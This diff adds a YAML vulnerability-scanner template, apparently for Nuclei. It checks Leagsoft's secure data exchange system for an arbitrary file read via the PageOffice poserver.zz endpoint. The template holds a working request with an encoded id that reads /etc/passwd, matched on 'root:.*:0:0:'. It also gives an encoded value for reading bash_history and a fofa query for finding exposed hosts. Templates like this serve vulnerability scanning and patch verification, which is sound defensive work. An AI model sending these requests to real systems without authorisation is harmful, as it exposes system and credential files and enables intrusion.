@@ -1,0 +1,33 @@
+id: leagsoft-safedata-poserver-file-fileread
+
+info:
+  name: 联软安全数据交换系统任意文件读取
+  author: qwtd
+  severity: high
+  description: |
+    联软安全数据交换系使用PageOffice组件导致任意文件读取 KmcgY3MtJm0lcmUsFl85ZhVmL3E4bSZ3amQvaitsF2srO2ckKW0icitsOHI/bis7OGM8cg== 读取bash_history
+  reference:
+    - https://wiki.wy876.cn/#/./%E8%81%94%E8%BD%AF/%E8%81%94%E8%BD%AF%E5%AE%89%E5%85%A8%E6%95%B0%E6%8D%AE%E4%BA%A4%E6%8D%A2%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96
+  metadata: 
+    fofa-query: 'body="UniExServices"'
+    verified: true
+    max-request: 1
+  tags: 联软科技-UniNXG
+
+
+http:
+  - method: GET
+    path:
+      - "{{RootURL}}/UniExServices/poserver.zz?pgop=opendiskdoc&id=KmcgY3MtK3IpLSRfOXE9YmpkL2orbBdrKztnJCltInIrbDhyP24rOzhjPHI="
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "The file cannot be downloaded"
+        condition: or
+
+      - type: status
+        status:
+          - 200
